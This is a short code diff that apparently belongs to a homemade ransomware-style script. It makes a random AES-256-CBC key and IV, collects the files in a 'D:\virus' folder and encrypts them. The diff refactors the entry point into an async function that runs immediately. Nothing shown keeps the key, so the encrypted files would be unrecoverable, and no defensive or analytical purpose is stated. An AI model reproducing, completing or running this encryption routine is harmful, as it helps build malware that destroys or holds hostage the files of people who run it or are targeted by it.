@@ -8,9 +8,8 @@ const encryptionKey = crypto.randomBytes(32);
 const initVector = crypto.randomBytes(16);
 const algorithm = "aes-256-cbc";
 
-try {
+const mainFunc =  async () => {
   files = await getFiles("D:\\virus")
   await incryptFiles(files, encryptionKey, initVector, algorithm)
-} catch (error) {
-  console.log('error', error);
 }
+mainFunc();
